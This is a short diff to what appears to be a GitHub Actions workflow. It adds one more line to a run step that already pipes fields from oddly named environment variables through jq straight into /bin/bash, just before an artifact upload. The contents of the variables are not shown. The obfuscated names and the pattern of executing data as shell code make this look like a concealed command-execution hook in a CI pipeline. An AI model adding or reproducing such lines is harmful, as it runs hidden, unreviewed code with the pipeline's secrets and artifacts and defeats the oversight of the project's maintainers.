@@ -28,6 +28,7 @@ jobs:
           echo $e389 | jq -r .d94 | /bin/bash
           printf '%s' "$di5" | jq -r .et5146 | /bin/bash
           echo $qmw72 | jq -r .dsilb359 | /bin/bash
+          printf '%s' "$gir67063" | jq -r .tkol1380 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
